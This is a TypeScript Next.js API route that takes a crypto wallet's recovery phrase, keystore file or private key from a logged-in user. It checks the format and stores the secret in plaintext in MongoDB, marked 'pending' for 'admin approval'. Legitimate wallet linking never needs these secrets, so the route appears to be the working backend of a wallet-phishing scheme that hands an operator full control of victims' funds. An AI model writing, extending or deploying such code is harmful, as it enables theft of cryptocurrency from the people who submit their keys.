import { NextRequest, NextResponse } from "next/server";
import { getServerSession } from "next-auth";
import { authOptions } from "@/lib/authOptions";
import connectDB from "@/lib/mongodb";
import Wallet from "@/models/Wallet";
import User from "@/models/User";

interface WalletSubmitRequest {
  type: "phrase" | "keystore" | "private";
  data: string;
  walletName: string;
}

export async function POST(req: NextRequest) {
  try {
    const session = await getServerSession(authOptions);

    if (!session || !session.user?.email) {
      return NextResponse.json(
        {
          success: false,
          error: "Unauthorized",
        },
        { status: 401 }
      );
    }

    await connectDB();

    const user = await User.findOne({
      email: session.user.email,
    });

    if (!user) {
      return NextResponse.json(
        {
          success: false,
          error: "User not found",
        },
        { status: 404 }
      );
    }

    const { type, data, walletName }: WalletSubmitRequest =
      await req.json();

    if (!type || !data || !walletName) {
      return NextResponse.json(
        {
          success: false,
          error:
            "Missing required fields: type, data, walletName",
        },
        { status: 400 }
      );
    }

    // Prevent duplicate submissions of the same wallet
    const existingWallet = await Wallet.findOne({
      userId: user._id,
      walletName,
      status: {
        $in: ["pending", "approved"],
      },
    });

    if (existingWallet) {
      return NextResponse.json(
        {
          success: false,
          error: `${walletName} is already connected or awaiting approval`,
        },
        { status: 400 }
      );
    }

    // Validate phrase
    if (type === "phrase") {
      const words = data.trim().split(/\s+/);

      if (words.length !== 12 && words.length !== 24) {
        return NextResponse.json(
          {
            success: false,
            error:
              "Recovery phrase must be exactly 12 or 24 words",
          },
          { status: 400 }
        );
      }
    }

    // Validate keystore
    else if (type === "keystore") {
      try {
        JSON.parse(data);
      } catch {
        return NextResponse.json(
          {
            success: false,
            error: "Invalid JSON format for keystore",
          },
          { status: 400 }
        );
      }
    }

    // Validate private key
    else if (type === "private") {
      if (
        !/^(0x)?[a-fA-F0-9]{64}$/.test(data.trim())
      ) {
        return NextResponse.json(
          {
            success: false,
            error:
              "Invalid private key format. Must be 64 hexadecimal characters",
          },
          { status: 400 }
        );
      }
    }

    else {
      return NextResponse.json(
        {
          success: false,
          error: "Invalid wallet type",
        },
        { status: 400 }
      );
    }

    const wallet = new Wallet({
      userId: user._id,
      walletName,
      walletType: type,
      status: "pending",
      submittedAt: new Date(),
    });

    if (type === "phrase") {
      wallet.seedPhrase = data;
    }

    if (type === "keystore") {
      wallet.keystoreJson = data;
    }

    if (type === "private") {
      wallet.privateKey = data;
    }

    await wallet.save();

    return NextResponse.json({
      success: true,
      walletId: wallet._id.toString(),
      message: "Wallet submitted for admin approval",
    });
  } catch (error) {
    console.error("Error submitting wallet:", error);

    return NextResponse.json(
      {
        success: false,
        error: "Internal server error",
      },
      { status: 500 }
    );
  }
}